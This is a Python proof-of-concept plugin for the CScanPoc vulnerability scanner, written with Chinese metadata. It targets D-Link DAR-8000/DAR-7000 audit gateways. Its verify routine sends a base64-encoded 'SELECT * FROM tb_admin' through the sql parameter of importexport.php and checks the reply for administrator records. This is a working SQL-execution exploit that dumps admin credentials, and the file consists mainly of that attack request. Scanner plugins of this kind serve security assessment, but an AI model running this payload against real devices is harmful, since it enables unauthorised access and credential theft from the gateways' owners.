# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time
import re


class Vuln(ABVuln):
    vuln_id = 'D-Link_0012'  # 平台漏洞编号，留空
    name = 'D-Link SQL命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-08-23'  # 漏洞公布时间
    desc = '''
        D-Link任意SQL命令执行(可直接获取管理员密码)。
        影响“DAR-8000 系列上网行为审计网关”和“DAR-7000 系列上网行为审计网关”两款网关。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'D-Link'  # 漏洞应用名称
    product_version = 'DAR-8000/DAR-7000'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '96c63631-ec46-44a8-9c82-a72f56b1ecec'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2010-0135939
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = arg + '/importexport.php?sql=U0VMRUNUICogRlJPTSB0Yl9hZG1pbg%3D%3D&tab=tb_admin&type=exportexcelbysql'
            code, head, res, err, _ = hh.http(payload)

            if code == 200 and '[admin]' in res:
                #security_hole('SQL execution: '+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
